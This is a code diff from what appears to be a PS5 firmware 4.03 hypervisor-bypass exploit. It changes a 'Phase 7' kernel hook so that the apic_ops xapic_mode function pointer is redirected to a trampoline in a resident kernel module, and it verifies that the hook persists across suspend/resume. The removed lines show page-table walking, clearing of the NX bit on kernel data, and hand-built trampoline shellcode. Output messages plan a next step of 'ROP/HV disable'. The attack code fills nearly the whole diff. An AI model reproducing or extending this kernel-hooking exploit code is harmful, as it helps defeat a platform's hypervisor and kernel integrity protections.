@@ -144,6 +144,9 @@ struct kmod_result_buf {
         uint64_t value;
     } msr_results[32];
     struct vmmcall_result results[KMOD_MAX_RESULTS];
+    /* Phase 7: trampoline addresses (filled by kmod init) */
+    volatile uint64_t trampoline_func_kva;    /* KVA of trampoline_xapic_mode() */
+    volatile uint64_t trampoline_target_kva;  /* KVA of g_trampoline_target */
 };
 
 /* kldsym lookup structure (matches FreeBSD sys/kld.h) */
@@ -189,6 +192,11 @@ static void    *g_msg_vaddr = NULL;
 /* apic_ops discovery results (set by Phase 3, used by Phase 7) */
 static uint64_t g_apic_ops_addr = 0;   /* KVA of apic_ops table */
 static int      g_apic_ops_count = 0;  /* Number of entries (typically 28) */
+
+/* Kmod trampoline addresses (set by kmod campaign, used by Phase 7) */
+static uint64_t g_kmod_trampoline_func = 0;    /* KVA of trampoline_xapic_mode() in kmod .text */
+static uint64_t g_kmod_trampoline_target = 0;  /* KVA of g_trampoline_target in kmod .data */
+static int      g_kmod_kid = -1;               /* kldload file ID (-1 = not loaded) */
 
 /* SBL kernel data offsets for FW 4.03 */
 static uint64_t g_mailbox_base_offset = 0;
@@ -4519,14 +4527,32 @@ idt_skip: ;
         }
     }
 
-    /* Step 5: Unload the module */
-    printf("\n[*] Step 5: Unloading kernel module...\n");
-    ret = syscall(SYS_kldunload, kid);
-    if (ret < 0) {
-        printf("[!] kldunload failed: errno=%d (%s)\n", errno, strerror(errno));
-        printf("    Module may still be loaded in kernel memory.\n");
+    /* Extract trampoline addresses for Phase 7 */
+    if (results->trampoline_func_kva != 0 && results->trampoline_target_kva != 0) {
+        g_kmod_trampoline_func = results->trampoline_func_kva;
+        g_kmod_trampoline_target = results->trampoline_target_kva;
+        g_kmod_kid = kid;
+        printf("\n[+] Phase 7 trampoline addresses from kmod:\n");
+        printf("    trampoline_xapic_mode() = 0x%016lx\n",
+               (unsigned long)g_kmod_trampoline_func);
+        printf("    g_trampoline_target     = 0x%016lx\n",
+               (unsigned long)g_kmod_trampoline_target);
+        printf("    Keeping module loaded for Phase 7 hook.\n");
+    }
+
+    /* Step 5: Unload the module (skip if Phase 7 needs it) */
+    if (g_kmod_kid > 0) {
+        printf("\n[*] Step 5: Skipping kldunload — module needed for Phase 7 trampoline.\n");
+        printf("    Module kid=%d remains loaded in kernel memory.\n", kid);
     } else {
-        printf("[+] Module unloaded successfully.\n");
+        printf("\n[*] Step 5: Unloading kernel module...\n");
+        ret = syscall(SYS_kldunload, kid);
+        if (ret < 0) {
+            printf("[!] kldunload failed: errno=%d (%s)\n", errno, strerror(errno));
+            printf("    Module may still be loaded in kernel memory.\n");
+        } else {
+            printf("[+] Module unloaded successfully.\n");
+        }
     }
 
     /* Clean up the .ko file */
@@ -4998,25 +5024,24 @@ static void campaign_flatz_setup(void) {
         }
 
         /*
-         * Detect post-resume state: if apic_ops[2] points into the
-         * kdata range instead of ktext, we left a hook from a prior
-         * run.  The cave address IS apic_ops[2] in that case.
+         * Detect post-resume state: if apic_ops[2] points outside of
+         * ktext, we left a hook from a prior run.
+         *
+         * Detection methods:
+         *   1. apic_ops[2] is NOT in ktext range → hooked (kmod trampoline
+         *      or old kdata cave approach)
+         *   2. QA flags contain PHASE7_MARKER (may be cleared on resume)
          */
         #define PHASE7_MARKER 0x42EFCDABUL
 
         int p7_is_post_resume = 0;
         uint64_t p7_hook_addr = ops[2];
-        if (p7_hook_addr >= g_kdata_base &&
-            p7_hook_addr < g_kdata_base + 0x2000000) {
-            /* apic_ops[2] points into kdata — likely our hook */
-            uint64_t hook_pa = va_to_pa_quiet(p7_hook_addr);
-            if (hook_pa) {
-                uint8_t hook_byte = 0;
-                kernel_copyout(g_dmap_base + hook_pa, &hook_byte, 1);
-                if (hook_byte == 0xC3) {
-                    p7_is_post_resume = 1;
-                }
-            }
+        int hook_outside_ktext = (p7_hook_addr < g_ktext_base ||
+                                  p7_hook_addr >= g_ktext_base + 0x2000000);
+        if (hook_outside_ktext) {
+            /* apic_ops[2] doesn't point into ktext — likely our hook.
+             * Could be kmod trampoline or old kdata cave. */
+            p7_is_post_resume = 1;
         }
 
         /* Also check QA flags for marker (parallel detection) */
@@ -5029,9 +5054,11 @@ static void campaign_flatz_setup(void) {
 
         if (p7_is_post_resume) {
             /* ─── Post-resume: check results ─── */
-            printf("\n[+] *** POST-RESUME DETECTED ***\n\n");
+            printf("\n[+] *** POST-RESUME / HOOK DETECTED ***\n\n");
 
-            /* Recover original xapic_mode from QA flags bytes 8-15 */
+            /* Recover original xapic_mode from QA flags bytes 8-15.
+             * Note: QA flags are reinitialized on resume (FW >= 3.00),
+             * so orig_xapic may be 0 after a real resume cycle. */
             uint64_t orig_xapic = 0;
             memcpy(&orig_xapic, &p7_qa[8], 8);
 
@@ -5040,43 +5067,53 @@ static void campaign_flatz_setup(void) {
 
             printf("[*] Checking apic_ops[2] (xapic_mode):\n");
             printf("    Current value:  0x%016lx\n", (unsigned long)xapic_now);
-            printf("    Original saved: 0x%016lx (from QA flags)\n",
-                   (unsigned long)orig_xapic);
+            if (orig_xapic)
+                printf("    Original saved: 0x%016lx (from QA flags)\n",
+                       (unsigned long)orig_xapic);
+            else
+                printf("    Original saved: (unavailable — QA flags were reinitialized)\n");
 
+            /* Classify where apic_ops[2] points */
             int hook_in_kdata = (xapic_now >= g_kdata_base &&
                                  xapic_now < g_kdata_base + 0x2000000);
+            int hook_in_ktext = (xapic_now >= g_ktext_base &&
+                                 xapic_now < g_ktext_base + 0x2000000);
 
-            if (hook_in_kdata) {
+            if (!hook_in_ktext) {
                 printf("\n[+] ============================================\n");
-                printf("[+]  APIC_OPS RET-HOOK SURVIVED RESUME!\n");
+                printf("[+]  APIC_OPS HOOK SURVIVED RESUME!\n");
                 printf("[+] ============================================\n");
-                printf("[+] apic_ops[2] still points to kdata (our ret gadget).\n");
-                printf("[+] System resumed successfully → hook FIRED!\n");
-                printf("[+] cpususpend_handler called xapic_mode → 0xC3 → ret → OK\n");
+                if (hook_in_kdata) {
+                    printf("[+] apic_ops[2] points to kdata (old code cave approach).\n");
+                } else {
+                    printf("[+] apic_ops[2] points outside ktext (kmod trampoline).\n");
+                    printf("[+] Hook address: 0x%016lx\n", (unsigned long)xapic_now);
+                    /* Try to read bytes at the hook address for diagnostics */
+                    uint64_t hook_pa = va_to_pa_quiet(xapic_now);
+                    if (hook_pa) {
+                        uint8_t hb[16];
+                        kernel_copyout(g_dmap_base + hook_pa, hb, 16);
+                        printf("[+] Bytes at hook: ");
+                        for (int i = 0; i < 16; i++) printf("%02x ", hb[i]);
+                        printf("\n");
+                    }
+                }
                 printf("[+]\n");
                 printf("[+] CONFIRMED on FW 4.03:\n");
-                printf("[+]   1. Kernel .data survives suspend/resume\n");
-                printf("[+]   2. Guest PTE modifications survive suspend/resume\n");
-                printf("[+]   3. apic_ops[2] is NOT reinitialized on resume\n");
-                printf("[+]   4. Code in kdata executes during resume path\n");
+                printf("[+]   1. Kernel .data (apic_ops) survives suspend/resume\n");
+                printf("[+]   2. apic_ops[2] is NOT reinitialized on resume\n");
+                printf("[+]   3. Kmod code survives suspend/resume\n");
+                printf("[+]   4. cpususpend_handler → xapic_mode → trampoline → OK\n");
                 printf("[+]   5. apic_ops hook method WORKS for HV bypass!\n");
                 printf("[+]\n");
-                printf("[+] Next: replace ret with real payload (ROP/HV disable)\n");
-
-                /* Clean up: restore 0x00 at the cave, restore apic_ops[2] */
-                uint64_t hook_pa = va_to_pa_quiet(xapic_now);
-                if (hook_pa) {
-                    uint8_t zero = 0;
-                    kernel_copyin(&zero, g_dmap_base + hook_pa, 1);
-                    printf("\n[*] Cleared ret gadget byte at cave.\n");
-                }
+                printf("[+] Next: replace trampoline with real payload (ROP/HV disable)\n");
             } else if (orig_xapic && xapic_now == orig_xapic) {
                 printf("\n[-] apic_ops[2] was restored to original xapic_mode.\n");
                 printf("    Kernel reinitializes apic_ops during resume.\n");
             } else {
-                printf("\n[?] apic_ops[2] has unexpected value: 0x%016lx\n",
+                printf("\n[?] apic_ops[2] points into ktext: 0x%016lx\n",
                        (unsigned long)xapic_now);
-                printf("    Possible: KASLR changed (cold reboot?)\n");
+                printf("    Possible: hook was restored by kernel, or KASLR changed.\n");
             }
 
             /* QA flags persistence check */
@@ -5087,7 +5124,7 @@ static void campaign_flatz_setup(void) {
             else
                 printf(" — reinitialized by secure loader.\n");
 
-            /* Restore apic_ops[2] to original */
+            /* Restore apic_ops[2] to original if we have it */
             if (orig_xapic && xapic_now != orig_xapic) {
                 printf("\n[*] Restoring apic_ops[2] → 0x%016lx\n",
                        (unsigned long)orig_xapic);
@@ -5097,6 +5134,10 @@ static void campaign_flatz_setup(void) {
                 printf("    Restored: 0x%016lx %s\n",
                        (unsigned long)verify_r,
                        verify_r == orig_xapic ? "[OK]" : "[MISMATCH]");
+            } else if (!orig_xapic && !hook_in_ktext) {
+                printf("\n[!] Cannot restore apic_ops[2] — original address unknown.\n");
+                printf("    QA flags were reinitialized on resume (expected on FW 4.03).\n");
+                printf("    Hook remains active. Re-run exploit to re-arm or reboot.\n");
             }
 
             /* Clear QA marker */
@@ -5107,209 +5148,96 @@ static void campaign_flatz_setup(void) {
             notify("[HV Research] Phase 7: Post-resume check complete!");
 
         } else {
-            /* ─── Pre-suspend: set up trampoline hook ─── */
-            printf("\n[*] Phase 7: Setting up trampoline hook for suspend/resume\n\n");
+            /* ─── Pre-suspend: set up kmod trampoline hook ─── */
+            printf("\n[*] Phase 7: Setting up kmod trampoline hook for suspend/resume\n\n");
 
             /*
-             * CRITICAL INSIGHT: lapic_xapic_mode() is called during
-             * NORMAL PS5 operation (not just suspend/resume as in stock
-             * FreeBSD).  A bare 'ret' silences the function, breaking
-             * APIC state and causing kernel panics on any UI navigation.
+             * APPROACH: Use the trampoline function in the kernel module's
+             * .text section.  The kmod was loaded by kldload into natively
+             * executable kernel memory (RWX on FW 4.03, GMET not enforced
+             * until FW 6.50).
              *
-             * SOLUTION: Write a trampoline that CALLS the original
-             * xapic_mode function.  Normal operation is preserved.
-             * On resume, the original function also runs (harmless).
-             * The trampoline proves the hook mechanism works.
+             * KEY INSIGHT: Previous attempts using kdata code caves failed
+             * because clearing the NX bit on guest PTEs is detected by the
+             * HV's periodic integrity monitor, causing kernel panics within
+             * seconds.  The kmod approach avoids ALL PTE modifications:
              *
-             * Trampoline shellcode (12 bytes):
-             *   mov rax, <original_xapic_mode>   ; 10 bytes
-             *   jmp rax                           ; 2 bytes (tail call)
+             *   1. trampoline_xapic_mode() lives in kmod .text (executable)
+             *   2. g_trampoline_target lives in kmod .data (writable via DMAP)
+             *   3. Only modification: apic_ops[2] function pointer (in kdata)
              *
-             * This is a transparent redirect — functionally identical
-             * to the original, but proves apic_ops[2] can be hooked.
-             *
-             * Later: add resume-specific logic BEFORE the jmp
-             * (e.g., disable HV protections, then call original).
+             * No NX clearing, no kdata cave hunting, no shellcode injection.
+             * The kmod was kept loaded (kldunload skipped) specifically for
+             * this purpose.
              */
 
             uint64_t original_xapic = ops[2];
             printf("    apic_ops[2] original: 0x%016lx\n",
                    (unsigned long)original_xapic);
 
-            /* Step 1: Scan kdata for safe code cave (256+ zero bytes) */
-            printf("\n[*] Step 1: Scanning kdata for safe code cave...\n");
-            printf("    Looking for 256+ consecutive zero bytes\n");
-            printf("    (scanning from kdata+0x10000 to skip early globals)\n");
-            fflush(stdout);
-
-            /*
-             * Scan kdata from offset 0x10000 (skip first 64KB of globals).
-             * Read 256-byte chunks, look for fully-zero blocks.
-             * 256-byte zero run = alignment padding, safe to use.
-             */
-            uint64_t cave_offset = 0;
-            int scan_run = 0;
-            for (uint64_t off = 0x10000; off < 0x200000 && !cave_offset; off += 256) {
-                uint8_t buf[256];
-                uint64_t chunk_kva = g_kdata_base + off;
-                uint64_t chunk_pa = va_to_pa_quiet(chunk_kva);
-                if (!chunk_pa) { scan_run = 0; continue; }
-
-                kernel_copyout(g_dmap_base + chunk_pa, buf, 256);
-                int all_zero = 1;
-                for (int i = 0; i < 256; i++) {
-                    if (buf[i] != 0) { all_zero = 0; break; }
-                }
-                if (all_zero) {
-                    scan_run += 256;
-                    if (scan_run >= 256) {
-                        cave_offset = off - scan_run + 256;
-                    }
-                } else {
-                    scan_run = 0;
-                }
-            }
-
-            if (!cave_offset) {
-                printf("[-] No safe code cave found (256B threshold)\n");
-                printf("    Trying from kdata+0x1000 with 64B threshold...\n");
-                scan_run = 0;
-                for (uint64_t off = 0x1000; off < 0x200000 && !cave_offset; off += 64) {
-                    uint8_t buf[64];
-                    uint64_t chunk_kva = g_kdata_base + off;
-                    uint64_t chunk_pa = va_to_pa_quiet(chunk_kva);
-                    if (!chunk_pa) { scan_run = 0; continue; }
-
-                    kernel_copyout(g_dmap_base + chunk_pa, buf, 64);
-                    int all_zero = 1;
-                    for (int i = 0; i < 64; i++) {
-                        if (buf[i] != 0) { all_zero = 0; break; }
-                    }
-                    if (all_zero) { cave_offset = off; }
-                }
-            }
-
-            if (!cave_offset) {
-                printf("[-] No code cave found in kdata.\n");
+            /* Check if kmod trampoline is available */
+            if (!g_kmod_trampoline_func || !g_kmod_trampoline_target) {
+                printf("[-] Kmod trampoline not available!\n");
+                printf("    trampoline_func  = 0x%lx\n",
+                       (unsigned long)g_kmod_trampoline_func);
+                printf("    trampoline_target = 0x%lx\n",
+                       (unsigned long)g_kmod_trampoline_target);
+                printf("    The kmod campaign may not have run or reported addresses.\n");
                 fflush(stdout);
                 return;
             }
 
-            uint64_t cave_kva = g_kdata_base + cave_offset;
-            uint64_t cave_phys = va_to_pa_quiet(cave_kva);
+            printf("    kmod trampoline func:   0x%016lx\n",
+                   (unsigned long)g_kmod_trampoline_func);
+            printf("    kmod trampoline target: 0x%016lx\n",
+                   (unsigned long)g_kmod_trampoline_target);
 
-            printf("[+] Code cave at kdata+0x%lx (KVA=0x%lx, PA=0x%lx)\n",
-                   (unsigned long)cave_offset,
-                   (unsigned long)cave_kva,
-                   (unsigned long)cave_phys);
+            /* Step 1: Write original xapic_mode address to g_trampoline_target
+             * via DMAP so the kmod trampoline knows where to redirect. */
+            printf("\n[*] Step 1: Writing original xapic_mode to kmod trampoline target...\n");
 
-            if (!cave_phys) {
-                printf("[-] Cave VA→PA failed\n");
+            uint64_t target_pa = va_to_pa_quiet(g_kmod_trampoline_target);
+            if (!target_pa) {
+                printf("[-] g_trampoline_target VA→PA failed\n");
+                fflush(stdout);
+                return;
+            }
+            printf("    g_trampoline_target PA: 0x%lx\n", (unsigned long)target_pa);
+
+            kernel_copyin(&original_xapic, g_dmap_base + target_pa, 8);
+
+            uint64_t target_verify = 0;
+            kernel_copyout(g_dmap_base + target_pa, &target_verify, 8);
+            printf("    Written: 0x%016lx [%s]\n",
+                   (unsigned long)target_verify,
+                   (target_verify == original_xapic) ? "OK" : "MISMATCH");
+
+            if (target_verify != original_xapic) {
+                printf("[-] Target write failed — aborting.\n");
                 fflush(stdout);
                 return;
             }
 
-            /* Step 2: Walk page table for cave_kva, clear NX */
-            printf("\n[*] Step 2: Clear NX bit on cave page...\n");
+            /* Step 2: Verify the trampoline function is at an executable page.
+             * Read a few bytes from the trampoline function via DMAP. */
+            printf("\n[*] Step 2: Verifying kmod trampoline is accessible...\n");
 
-            uint64_t walk_e;
-            uint64_t walk_pa;
-            uint64_t p7_pte_pa = 0;
-            uint64_t p7_orig_pte = 0;
-            int p7_is_2mb = 0;
-
-            walk_pa = g_cr3_phys + ((cave_kva >> 39) & 0x1FF) * 8;
-            kernel_copyout(g_dmap_base + walk_pa, &walk_e, 8);
-            if (!(walk_e & PTE_PRESENT)) {
-                printf("[-] PML4E not present\n"); fflush(stdout); return;
+            uint64_t func_pa = va_to_pa_quiet(g_kmod_trampoline_func);
+            if (!func_pa) {
+                printf("[-] trampoline_xapic_mode VA→PA failed\n");
+                fflush(stdout);
+                return;
             }
-            walk_pa = (walk_e & PTE_PA_MASK) + ((cave_kva >> 30) & 0x1FF) * 8;
-            kernel_copyout(g_dmap_base + walk_pa, &walk_e, 8);
-            if (!(walk_e & PTE_PRESENT)) {
-                printf("[-] PDPE not present\n"); fflush(stdout); return;
-            }
-            walk_pa = (walk_e & PTE_PA_MASK) + ((cave_kva >> 21) & 0x1FF) * 8;
-            kernel_copyout(g_dmap_base + walk_pa, &walk_e, 8);
-            if (!(walk_e & PTE_PRESENT)) {
-                printf("[-] PDE not present\n"); fflush(stdout); return;
-            }
-            if (walk_e & PTE_PS) {
-                p7_is_2mb = 1;
-                p7_pte_pa = walk_pa;
-                p7_orig_pte = walk_e;
-            } else {
-                walk_pa = (walk_e & PTE_PA_MASK) + ((cave_kva >> 12) & 0x1FF) * 8;
-                kernel_copyout(g_dmap_base + walk_pa, &walk_e, 8);
-                if (!(walk_e & PTE_PRESENT)) {
-                    printf("[-] PTE not present\n"); fflush(stdout); return;
-                }
-                p7_pte_pa = walk_pa;
-                p7_orig_pte = walk_e;
-            }
+            printf("    trampoline_xapic_mode PA: 0x%lx\n", (unsigned long)func_pa);
 
-            printf("    PTE at PA 0x%lx: 0x%016lx (%s page)\n",
-                   (unsigned long)p7_pte_pa, (unsigned long)p7_orig_pte,
-                   p7_is_2mb ? "2MB" : "4KB");
-            printf("    NX=%d RW=%d\n",
-                   (int)(p7_orig_pte >> 63), (int)((p7_orig_pte >> 1) & 1));
-
-            if (p7_orig_pte >> 63) {
-                uint64_t p7_new_pte = p7_orig_pte;
-                p7_new_pte &= ~PTE_BIT_NX;
-                p7_new_pte &= ~(1ULL << 8);  /* clear G for TLB */
-                kernel_copyin(&p7_new_pte, g_dmap_base + p7_pte_pa, 8);
-
-                uint64_t pte_verify = 0;
-                kernel_copyout(g_dmap_base + p7_pte_pa, &pte_verify, 8);
-                printf("    New PTE: 0x%016lx NX=%d [%s]\n",
-                       (unsigned long)pte_verify,
-                       (int)(pte_verify >> 63),
-                       (pte_verify == p7_new_pte) ? "OK" : "MISMATCH");
-            } else {
-                printf("    NX already clear — page is executable.\n");
-            }
-
-            /* Step 3: Build and write trampoline shellcode */
-            printf("\n[*] Step 3: Writing trampoline to cave...\n");
-
-            /*
-             * Trampoline: transparent redirect to original xapic_mode.
-             *   +0:  48 B8 <addr>   mov rax, <original_xapic_mode>
-             *   +10: FF E0          jmp rax
-             * Total: 12 bytes.  Tail call — stack untouched.
-             */
-            uint8_t trampoline[16];
-            int tlen = 0;
-            trampoline[tlen++] = 0x48;  /* REX.W */
-            trampoline[tlen++] = 0xB8;  /* mov rax, imm64 */
-            memcpy(&trampoline[tlen], &original_xapic, 8);
-            tlen += 8;
-            trampoline[tlen++] = 0xFF;  /* jmp rax */
-            trampoline[tlen++] = 0xE0;
-            /* tlen = 12 */
-
-            printf("    Trampoline (%d bytes): ", tlen);
-            for (int i = 0; i < tlen; i++) printf("%02x ", trampoline[i]);
+            uint8_t func_bytes[16];
+            kernel_copyout(g_dmap_base + func_pa, func_bytes, 16);
+            printf("    First 16 bytes: ");
+            for (int i = 0; i < 16; i++) printf("%02x ", func_bytes[i]);
             printf("\n");
-            printf("    Target: jmp 0x%016lx (original xapic_mode)\n",
-                   (unsigned long)original_xapic);
 
-            kernel_copyin(trampoline, g_dmap_base + cave_phys, tlen);
-
-            /* Verify */
-            uint8_t t_verify[16];
-            kernel_copyout(g_dmap_base + cave_phys, t_verify, tlen);
-            int t_ok = (memcmp(trampoline, t_verify, tlen) == 0);
-            printf("    Write verify: %s\n", t_ok ? "OK" : "MISMATCH");
-
-            if (!t_ok) {
-                printf("[-] Trampoline write failed — aborting.\n");
-                fflush(stdout);
-                return;
-            }
-
-            /* Step 4: Store metadata in QA flags */
-            printf("\n[*] Step 4: Storing metadata in QA flags...\n");
+            /* Step 3: Store metadata in QA flags */
+            printf("\n[*] Step 3: Storing metadata in QA flags...\n");
 
             uint8_t qa_set[16];
             kernel_get_qaflags(qa_set);
@@ -5327,38 +5255,42 @@ static void campaign_flatz_setup(void) {
             printf("    QA marker: 0x%08x [%s]\n", mv,
                    mv == PHASE7_MARKER ? "OK" : "FAIL");
 
-            /* Step 5: Hook apic_ops[2] → cave trampoline */
-            printf("\n[*] Step 5: Hooking apic_ops[2] → trampoline...\n");
+            /* Step 4: Hook apic_ops[2] → kmod trampoline */
+            printf("\n[*] Step 4: Hooking apic_ops[2] → kmod trampoline...\n");
 
             uint64_t slot2_dmap = g_dmap_base + ops_pa + 0x10;
-            kernel_copyin(&cave_kva, slot2_dmap, 8);
+            kernel_copyin(&g_kmod_trampoline_func, slot2_dmap, 8);
 
             uint64_t hook_verify = 0;
             kernel_copyout(slot2_dmap, &hook_verify, 8);
             printf("    apic_ops[2] = 0x%016lx [%s]\n",
                    (unsigned long)hook_verify,
-                   (hook_verify == cave_kva) ? "OK" : "MISMATCH");
+                   (hook_verify == g_kmod_trampoline_func) ? "OK" : "MISMATCH");
 
             printf("\n[+] ============================================\n");
-            printf("[+]  TRAMPOLINE HOOK ARMED!\n");
+            printf("[+]  KMOD TRAMPOLINE HOOK ARMED!\n");
             printf("[+] ============================================\n");
             printf("[+]\n");
             printf("[+] Summary:\n");
-            printf("[+]   Cave (kdata+0x%lx): 12-byte trampoline\n",
-                   (unsigned long)cave_offset);
-            printf("[+]     → jmp to original xapic_mode (0x%lx)\n",
+            printf("[+]   Trampoline: kmod trampoline_xapic_mode() at 0x%lx\n",
+                   (unsigned long)g_kmod_trampoline_func);
+            printf("[+]   Target:     g_trampoline_target at 0x%lx → 0x%lx\n",
+                   (unsigned long)g_kmod_trampoline_target,
                    (unsigned long)original_xapic);
-            printf("[+]   Cave page PTE: NX cleared\n");
-            printf("[+]   apic_ops[2]:   0x%lx → trampoline\n",
-                   (unsigned long)cave_kva);
+            printf("[+]   apic_ops[2]: hooked to kmod trampoline\n");
+            printf("[+]\n");
+            printf("[+] KEY ADVANTAGE: No PTE modifications!\n");
+            printf("[+]   - Trampoline is in kmod .text (natively executable)\n");
+            printf("[+]   - No NX clearing needed (avoids HV integrity check)\n");
+            printf("[+]   - Only change: apic_ops[2] function pointer\n");
             printf("[+]\n");
             printf("[+] Normal operation: xapic_mode still called (via trampoline)\n");
-            printf("[+]   → System should work normally! No more panics.\n");
+            printf("[+]   → System should work normally! No panics.\n");
             printf("[+]\n");
             printf("[+] TO TEST: Navigate menus, press PS button — should be stable.\n");
             printf("[+]          Then enter REST MODE, wake, re-run exploit.\n");
 
-            notify("[HV Research] Phase 7: TRAMPOLINE hook armed. Test stability + REST MODE!");
+            notify("[HV Research] Phase 7: KMOD trampoline hook armed! Test stability + REST MODE!");
         }
 
         printf("\n");
